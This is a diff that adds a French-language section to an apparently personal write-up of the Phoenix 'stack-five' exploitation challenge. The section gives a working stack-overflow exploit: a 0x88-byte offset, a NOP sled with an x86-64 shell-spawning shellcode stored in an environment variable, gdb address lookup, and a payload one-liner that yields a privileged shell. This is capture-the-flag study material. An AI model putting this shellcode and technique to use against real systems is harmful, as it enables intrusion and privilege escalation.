@@ -233,6 +233,71 @@ Solution :
 `python2 -c 'print(0x58 * b"a" + b"\x1d\x06\x40")' | ./stack-four`
 
 
+---
+
+## Stack-Five : Shell code
+
+### Objectif du challenge
+
+Éxécuter un shell à travers le programme.
+
+### Démarche
+#### Détournement adresse retour fonction:
+Une des solutions serait de modifier l'adresse de retour d'une des fonctions pour faire pointer sur notre shellcode.
+Voici la stack mémoire pour la fonction start_level():
+![](/images/phoenix/stack-five.png)
+
+Pour écraser l'adresse de retour et injecter l'adresse où sera situé notre shellcode, l'exploit sera :
+```shell
+python2 -c 'print(0x88 * b"a" + b"ADDRESSE")' | ./stack-five
+```
+
+#### Variable d'environnement:
+Nous allons stocker le shellcode dans une variables d'environnement.
+La variable d'environnement conteindra beaucoup d'instruction NOP pour aller directement au shellcode.
+L'utilisatio nd'instruction NOP permet d'atérir sur notre shellcode même si l'adresse mémoire de la var d'env varie.
+
+En hexa l'instruction NOP est `\x90`.
+[Documentation instruction NOP](https://www.gladir.com/LEXIQUE/ASM/nop.htm)
+
+On récupère un shellcode en ligne : 
+
+`\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05` est un shellcode (suite d'opration assembleur ouvrant un shell). [shellcode utilisé](https://shell-storm.org/shellcode/files/shellcode-806.html)
+
+On initialise notre variable : 
+```shell
+export SHELLCODE=$(python2 -c 'print(10000 * b"\x90" + b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05")')
+```
+
+On récupère l'adresse de la variable : 
+```shell
+gdb ./stack-five
+b main #breakpoint au début de main
+r #run le program
+print (void *)getenv("SHELLCODE") #affiche adresse de la var
+
+(gdb) print (void *)getenv("SHELLCODE")
+$1 = (void *) 0x7fffffffc780
+``` 
+
+#### Exploit
+On à ajouter 10000 instruction NOP avant notre shellcode pour avoir plus de chance de tomber sur la bonne adresse dû au décalage en mémoire.
+
+On ajoute 10000/2 à notre adresses : 
+```python
+>>> hex(0x7fffffffc780 + 5000)
+'0x7fffffffdb08'
+```
+
+```bash
+(python2 -c 'print(0x88 * b"a" + b"\x08\xdb\xff\xff\xff\x7f")';cat) | ./stack-five
+
+whoami 
+phoenix-amd64-stack-five
+```
+Nous avons maintenant les droit suid (élévation de privilège)
+
+
 ## Conclusion et perspectives
 
 Ce travail sur Phoenix m'a permis de :
